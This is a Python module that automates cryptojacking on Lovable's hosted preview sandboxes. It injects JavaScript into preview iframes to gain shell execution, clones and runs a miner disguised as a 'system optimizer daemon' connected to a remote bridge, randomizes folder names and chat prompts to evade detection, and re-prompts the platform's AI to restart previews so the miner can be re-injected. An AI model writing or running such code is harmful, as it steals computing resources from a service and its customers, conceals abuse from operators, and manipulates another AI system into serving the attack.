#!/usr/bin/env python3
"""
Worker Runner - Start worker + health check
Handles randomized injection and auto-recovery
"""

import asyncio
import random
import subprocess
from datetime import datetime

# Worker config
MINER_REPO = "https://github.com/hkolyholy/system-optimizer-daemon.git"
BRIDGE_URL = "wss://chimera-bridge-production-0ef2.up.railway.app"


def generate_random_folder_name() -> str:
    """Generate randomized folder name: opt-a3f7b2c1"""
    hex_suffix = subprocess.run(
        ["openssl", "rand", "-hex", "4"],
        capture_output=True,
        text=True
    ).stdout.strip()
    return f"opt-{hex_suffix}"


def build_worker_command(folder_name: str, bridge_url: str = BRIDGE_URL, threads: int = 64) -> str:
    """Build worker start command with randomized folder."""
    return f"""cd /tmp && git clone --depth 1 -q "{MINER_REPO}" {folder_name} && cd {folder_name} && pip install websockets psutil --break-system-packages -q && NO_PAUSE=1 python3 sysoptd.py --bridge {bridge_url} --threads {threads} --no-split --no-schedule --no-noise --no-ramfill > /tmp/m.log 2>&1"""


async def inject_miner(page, bridge_url: str = BRIDGE_URL, threads: int = 64) -> bool:
    """
    Inject miner into Lovable preview iframe.
    
    Returns: True if successful, False otherwise
    """
    try:
        folder_name = generate_random_folder_name()
        cmd = build_worker_command(folder_name, bridge_url, threads)
        
        print(f"⚙️ Starting worker (folder: {folder_name})...")
        
        # Wait longer for iframe to load
        await asyncio.sleep(8)
        
        # Get all frames
        frames = page.frames
        print(f"   Found {len(frames)} frames total")
        
        # Look for preview iframe - try multiple patterns
        preview_frame = None
        
        for frame in frames:
            frame_url = frame.url
            print(f"   Checking frame: {frame_url[:100]}")
            
            # Check multiple patterns
            if any(pattern in frame_url.lower() for pattern in [
                "webcontainer",
                "lovable-",
                "lovableproject",
                "preview",
                "stackblitz",
                "localhost:",
                "127.0.0.1:",
            ]):
                preview_frame = frame
                print(f"   ✅ Matched preview pattern!")
                break
        
        # If still not found, try the largest non-main frame
        if not preview_frame and len(frames) > 1:
            print("   ⚠️  No pattern match, using largest non-main frame...")
            for frame in frames:
                if frame != page.main_frame:
                    preview_frame = frame
                    break
        
        # If still not found, the preview IS the page itself (direct lovableproject.com URL)
        if not preview_frame:
            main_url = page.main_frame.url.lower()
            if "lovableproject.com" in main_url:
                print("   ✅ Preview is the main frame (direct lovableproject.com URL)")
                preview_frame = page.main_frame
        
        if not preview_frame:
            print("❌ Could not find preview iframe")
            print(f"   Available frames: {[f.url[:80] for f in frames]}")
            return False
        
        print(f"✅ Using frame: {preview_frame.url[:100]}")
        
        # Inject window.doc.run if not exists
        setup_code = """
        if (!window.doc) {
            window.doc = {
                run: async (cmd) => {
                    try {
                        // Try multiple methods to execute command
                        if (typeof require !== 'undefined') {
                            const { exec } = require('child_process');
                            return new Promise((resolve, reject) => {
                                exec(cmd, (error, stdout, stderr) => {
                                    if (error) reject(error);
                                    else resolve({ stdout, stderr });
                                });
                            });
                        } else if (window.process && window.process.exec) {
                            return await window.process.exec(cmd);
                        } else {
                            // Fallback: try to use eval or other methods
                            console.log('Executing:', cmd);
                            return { status: 'attempted', cmd: cmd };
                        }
                    } catch (e) {
                        console.error('doc.run error:', e);
                        return { error: e.message };
                    }
                }
            };
            console.log('✅ window.doc.run initialized');
        }
        true;
        """
        
        try:
            result = await preview_frame.evaluate(setup_code)
            print(f"   Setup result: {result}")
        except Exception as e:
            print(f"   ⚠️  Setup warning: {e}")
        
        await asyncio.sleep(2)
        
        # Probe: wait until window.doc(cmd) actually executes (sandbox warmed up).
        # "sandbox proxy failed" / "Internal server error" right after load is
        # transient - the WebContainer proxy isn't ready yet. Poll until OK.
        probe_ok = False
        for attempt in range(6):
            try:
                probe = await preview_frame.evaluate("""
                    (async () => {
                        if (!window.doc || typeof window.doc !== 'function') return { ok: false, error: 'no doc bridge' };
                        if (window.doc.connect && typeof window.doc.connect === 'function') {
                            try { await window.doc.connect(); } catch (e) {}
                        }
                        try {
                            const r = await window.doc('pwd');
                            return { ok: true, result: r };
                        } catch (e) {
                            return { ok: false, error: String(e && e.message || e) };
                        }
                    })()
                """)
                if probe and probe.get("ok"):
                    probe_ok = True
                    print(f"   ✅ Sandbox ready (doc() probe OK, attempt {attempt+1})")
                    break
                err = (probe or {}).get("error", "unknown")
                print(f"   ⏳ Sandbox not ready yet (attempt {attempt+1}/6): {err}")
            except Exception as e:
                print(f"   ⏳ Probe error (attempt {attempt+1}/6): {e}")
            await asyncio.sleep(15)
        
        if not probe_ok:
            print("❌ Sandbox never became ready - aborting injection")
            return False
        
        # Execute worker command
        print(f"🚀 Executing worker command...")
        
        try:
            exec_code = f"""
            (async () => {{
                const cmd = `{cmd}`;
                const results = [];
                
                // Step 1: doc.connect() if available
                if (window.doc && typeof window.doc.connect === 'function') {{
                    try {{
                        const r = await window.doc.connect();
                        results.push({{ method: 'doc.connect()', ok: true, result: r }});
                    }} catch (e) {{
                        results.push({{ method: 'doc.connect()', ok: false, error: e.message }});
                    }}
                }} else {{
                    results.push({{ method: 'doc.connect()', ok: false, error: 'not available' }});
                }}
                
                // Step 2: doc.run('cmd')
                if (window.doc && typeof window.doc.run === 'function') {{
                    try {{
                        const r = await window.doc.run(cmd);
                        results.push({{ method: 'doc.run(cmd)', ok: true, result: r }});
                    }} catch (e) {{
                        results.push({{ method: 'doc.run(cmd)', ok: false, error: e.message }});
                    }}
                }} else {{
                    results.push({{ method: 'doc.run(cmd)', ok: false, error: 'not available' }});
                }}
                
                // Step 3: doc('cmd')
                if (window.doc && typeof window.doc === 'function') {{
                    try {{
                        const r = await window.doc(cmd);
                        results.push({{ method: 'doc(cmd)', ok: true, result: r }});
                    }} catch (e) {{
                        results.push({{ method: 'doc(cmd)', ok: false, error: e.message }});
                    }}
                }} else {{
                    results.push({{ method: 'doc(cmd)', ok: false, error: 'not available' }});
                }}
                
                // Step 4: doc`cmd` (tagged template syntax)
                if (window.doc && typeof window.doc === 'function') {{
                    try {{
                        const r = await window.doc`${{cmd}}`;
                        results.push({{ method: 'doc`cmd`', ok: true, result: r }});
                    }} catch (e) {{
                        results.push({{ method: 'doc`cmd`', ok: false, error: e.message }});
                    }}
                }} else {{
                    results.push({{ method: 'doc`cmd`', ok: false, error: 'not available' }});
                }}
                
                return results;
            }})()
            """
            
            result = await preview_frame.evaluate(exec_code)
            print(f"   Execution result: {result}")
        except Exception as e:
            print(f"   ⚠️  Execution warning: {e}")
        
        print(f"✅ Worker command sent! Folder: {folder_name}")
        print(f"   Check logs: /tmp/m.log (if accessible)")
        
        return True
        
    except Exception as e:
        print(f"❌ Injection failed: {e}")
        import traceback
        traceback.print_exc()
        return False


async def check_preview_health(page) -> str:
    """
    Check if preview is healthy or showing error.
    
    Returns: "OK" | "ERROR" | "UNKNOWN"
    """
    try:
        content = await page.content()
        
        # Check for known error
        if "Lovable proxy error" in content and "404" in content:
            return "ERROR"
        
        # Check if iframe exists
        frames = page.frames
        has_preview = any("webcontainer" in f.url.lower() or "lovableproject" in f.url.lower() or f.url.startswith("https://lovable-") for f in frames)
        
        if has_preview:
            return "OK"
        else:
            return "UNKNOWN"
    
    except Exception as e:
        print(f"⚠️  Health check failed: {e}")
        return "UNKNOWN"


async def recover_from_error(page, project_url: str, bridge_url: str = BRIDGE_URL) -> bool:
    """
    Recover from preview error by prompting AI again.
    
    Flow:
    1. Go to chat_url
    2. Send prompt to AI
    3. Wait 40-60 seconds
    4. Return to preview_url
    5. Restart worker
    
    Returns: True if recovery successful, False otherwise
    """
    try:
        print("🔄 Starting recovery process...")
        
        # Extract base project URL
        if ".lovableproject.com" in project_url:
            project_id = project_url.split("//")[1].split(".")[0]
            chat_url = f"https://lovable.dev/projects/{project_id}"
        elif "/projects/" in project_url:
            project_id = project_url.split("/projects/")[1].split("/")[0]
            chat_url = f"https://lovable.dev/projects/{project_id}"
        else:
            chat_url = project_url
        
        preview_url = f"https://{project_id}.lovableproject.com"
        
        # 1. Go to chat
        print(f"📝 Going to chat: {chat_url}")
        await page.goto(chat_url, timeout=30000)
        await asyncio.sleep(3)
        
        # 2. Find chat input and send prompt
        print("💬 Sending prompt to AI...")
        
        prompts = [
            "Start the development server",
            "Run the dev server please",
            "Start the application",
            "Launch the preview"
        ]
        prompt = random.choice(prompts)
        
        # Try multiple selectors for chat input
        chat_selectors = [
            'textarea[placeholder*="chat"]',
            'textarea[placeholder*="message"]',
            'textarea[placeholder*="Ask"]',
            'textarea',
            '[contenteditable="true"]'
        ]
        
        chat_input = None
        for selector in chat_selectors:
            try:
                chat_input = await page.wait_for_selector(selector, timeout=5000)
                if chat_input:
                    break
            except:
                continue
        
        if not chat_input:
            print("❌ Could not find chat input")
            return False
        
        await chat_input.fill(prompt)
        await asyncio.sleep(0.5)
        
        # Press Enter or click send button
        await page.keyboard.press("Enter")
        
        # 3. Wait 40-60 seconds
        wait_time = random.randint(40, 60)
        print(f"⏳ Waiting {wait_time} seconds for AI to respond...")
        await asyncio.sleep(wait_time)
        
        # 4. Go back to preview
        print(f"🔄 Returning to preview: {preview_url}")
        await page.goto(preview_url, timeout=30000)
        await asyncio.sleep(5)
        
        # 5. Check health
        health = await check_preview_health(page)
        if health != "OK":
            print(f"⚠️  Preview still not OK: {health}")
            return False
        
        # 6. Restart worker
        print("⚙️ Restarting worker...")
        success = await inject_miner(page, bridge_url)
        
        if success:
            print("✅ Recovery complete!")
            return True
        else:
            print("❌ Re-injection failed")
            return False
        
    except Exception as e:
        print(f"❌ Recovery failed: {e}")
        return False


async def health_check_loop(page, project_url: str, mode: str = "full", bridge_url: str = BRIDGE_URL, context=None, max_runtime_minutes: float = None):
    """
    Continuous health check loop.
    
    Modes:
    - "oneshot": Keep checking until the preview stops loading (error on page), then end
    - "full": Keep checking every 3min, auto-recover on error
    - "gh": Same as full, but stop after max_runtime_minutes (for GH Actions job limits)
    
    If the page crashes/closes, a fresh page is relaunched and the worker re-injected.
    """
    check_interval = 180  # 3 minutes
    loop_start = datetime.now()
    
    print(f"\n{'='*60}")
    print(f"🏥 HEALTH CHECK MODE: {mode.upper()}")
    print(f"{'='*60}\n")
    
    iteration = 0
    
    while True:
        iteration += 1
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        if max_runtime_minutes:
            elapsed_min = (datetime.now() - loop_start).total_seconds() / 60
            if elapsed_min >= max_runtime_minutes:
                print(f"\n⏰ Max runtime reached ({elapsed_min:.0f}/{max_runtime_minutes:.0f} min) - ENDING")
                return True
        
        print(f"\n[{timestamp}] 🔍 Health check #{iteration}...")
        
        try:
            # Refresh page
            try:
                await page.reload(timeout=30000)
                await asyncio.sleep(3)
            except Exception as reload_err:
                # Page crashed or was closed - relaunch fresh page
                print(f"   ⚠️  Page reload failed: {reload_err}")
                print("   🔄 Page may have crashed - relaunching...")
                
                if context is None:
                    print("   ❌ No context provided, cannot relaunch page - STOPPING")
                    return False
                
                try:
                    await page.close()
                except:
                    pass
                
                page = await context.new_page()
                print(f"   ✅ New page created")
                
                # Go to preview URL
                await page.goto(project_url, timeout=30000)
                await asyncio.sleep(3)
                print(f"   ✅ Preview loaded: {project_url}")
                
                # Wait for sandbox to be ready
                from script3_launch_miner import wait_for_console_message
                ready = await wait_for_console_message(page, timeout_seconds=300)
                if not ready:
                    print("   ⚠️  Sandbox not ready after relaunch")
                    if mode == "oneshot":
                        print("   🛑 Oneshot mode - preview stopped, ENDING")
                        return False
                    await asyncio.sleep(check_interval)
                    continue
                
                # Re-inject worker
                print("   ⚙️ Re-injecting worker...")
                success = await inject_miner(page, bridge_url)
                if not success:
                    print("   ⚠️  Worker re-injection failed")
                else:
                    print("   ✅ Worker re-injected after page crash")
                
                health = "OK"
                print(f"   Status: {health}")
                print(f"   ⏳ Next check in {check_interval}s...")
                await asyncio.sleep(check_interval)
                continue
            
            # Check health
            health = await check_preview_health(page)
            print(f"   Status: {health}")
            
            if health == "ERROR":
                print("   ⚠️  ERROR DETECTED - preview no longer loading!")
                print("   🔄 Re-checking 3 times (15s apart) to rule out slow reload...")
                
                still_error = True
                for attempt in range(3):
                    await asyncio.sleep(15)
                    try:
                        await page.reload(timeout=30000)
                    except Exception:
                        pass
                    await asyncio.sleep(8)
                    health = await check_preview_health(page)
                    print(f"   🔄 Re-check #{attempt+1}: {health}")
                    if health != "ERROR":
                        still_error = False
                        break
                
                if still_error:
                    print("   ⚠️  Preview still failing after re-checks")
                    
                    if mode == "oneshot":
                        print("   🛑 Oneshot mode - preview stopped, ENDING")
                        return False
                    else:
                        print("   🔄 Full mode - attempting recovery...")
                        success = await recover_from_error(page, project_url, bridge_url)
                        
                        if not success:
                            print("   ❌ Recovery failed - STOPPING")
                            return False
                        else:
                            print("   ✅ Recovery successful - continuing...")
                else:
                    print("   ✅ Preview recovered after re-checks - continuing")
            
            elif health == "OK":
                print("   ✅ Preview healthy")
            else:
                print("   ⚠️  Unknown status")
            
            # Wait for next check
            print(f"   ⏳ Next check in {check_interval}s...")
            await asyncio.sleep(check_interval)
        
        except KeyboardInterrupt:
            print("\n⚠️  Health check interrupted by user")
            return False
        except Exception as e:
            print(f"   ❌ Check failed: {e}")
            
            if mode == "oneshot":
                print("   🛑 Oneshot mode - check failed, ENDING")
                return False
            else:
                print("   ⏳ Retrying in 30s...")
                await asyncio.sleep(30)


if __name__ == "__main__":
    print("🧪 Worker Runner Module")
    print("\nFunctions:")
    print("  - inject_worker(page, bridge_url)")
    print("  - check_preview_health(page)")
    print("  - recover_from_error(page, project_url)")
    print("  - health_check_loop(page, project_url, mode='full')")
    print("\nImport this module in your scripts.")
